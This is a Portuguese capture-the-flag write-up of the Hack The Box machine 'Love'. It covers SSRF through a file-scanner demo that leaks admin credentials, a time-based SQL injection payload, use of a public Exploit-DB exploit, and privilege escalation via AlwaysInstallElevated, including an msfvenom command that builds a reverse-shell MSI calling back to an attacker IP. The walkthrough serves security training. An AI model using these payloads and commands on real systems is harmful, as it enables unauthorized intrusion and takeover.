Enumeração de serviços:
![[Write-up/Hack The Box/Love/img/Pasted image 20240305233250.png]]![[Write-up/Hack The Box/Love/img/Pasted image 20240305233312.png]]
Através do Nmap, foi possível identificar um subdomínio:
![[Write-up/Hack The Box/Love/img/Pasted image 20240305233751.png]]
Ao adicionar o domínio no `/etc/hosts` e navegar pelo site, descobrimos uma ferramenta chamada Free File Scanner, com um menu de demonstração onde é possível indicar uma URL, possívelmente para que o arquivo na URL seja escaneado.
![[Write-up/Hack The Box/Love/img/Pasted image 20240305234009.png]]
Vamos fazer um teste criando um arquivo TXT com a palavra Teste, abrir um servidor HTTP na máquina atacante e indicar esse arquivo no site alvo.
![[Write-up/Hack The Box/Love/img/Pasted image 20240305234110.png]]
![[Write-up/Hack The Box/Love/img/Pasted image 20240305234128.png]]
Ao clicar em Scan file, percebemos que o conteúdo do arquivo de teste foi exibido na página.
![[Write-up/Hack The Box/Love/img/Pasted image 20240305234208.png]]
Vamos então tentar inserir um payload em PHP para executar comandos no alvo.
A página não executa o payload.
Pesquisando novamente sobre o sistema de votação utilizado na página principal, descobrimos que a página tem uma possível vulnerabilidade de SQLi. Vamos testar com o payload `' AND (SELECT 2487 FROM (SELECT(SLEEP(5)))WYpt) AND 'hBVQ'='hBVQ`.
![[Write-up/Hack The Box/Love/img/Pasted image 20240313224446.png]]
A página demorou 5 segundo pra responder, indicando que o nosso payload funcionou.![[Write-up/Hack The Box/Love/img/Pasted image 20240314004011.png]]
Voltando ao Free File Scan, tentamos acessar as portas do host através do IP interno e descobrimos um usuário e senha na porta 5000:
![[Write-up/Hack The Box/Love/img/Pasted image 20240317161625.png]]
`admin:@LoveIsInTheAir!!!!`
Com o login encontrado, conseguimos acessar o painel administrativo:
![[Write-up/Hack The Box/Love/img/Pasted image 20240317162335.png]]
Existe um exploit público da versão instalada, fizemos algumas modificações e executamos o exploit, pegando assim a shell da máquina alvo:
https://www.exploit-db.com/exploits/49445
![[Write-up/Hack The Box/Love/img/Pasted image 20240317164712.png]]

Identificação do sistema operacional:
![[Write-up/Hack The Box/Love/img/Pasted image 20240317164944.png]]

Ao enumerar as possível vulnerabilidades do sistema com o winPEAS, descobrimos que a configuração AlwaysInstallElevated está habilitada no alvo.
![[Write-up/Hack The Box/Love/img/Pasted image 20240317171714.png]]
Essa vulnerabilidade permite que qualquer usuário rode arquivos MSI com privilégios elevados, sendo assim, montamos um payload com msfvenom e enviamos para o alvo.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4321 -a x64 --platform Windows -f msi -o evil.msi
```
Ao executar, recebemos a shell como administrador:
![[Write-up/Hack The Box/Love/img/Pasted image 20240317171911.png]]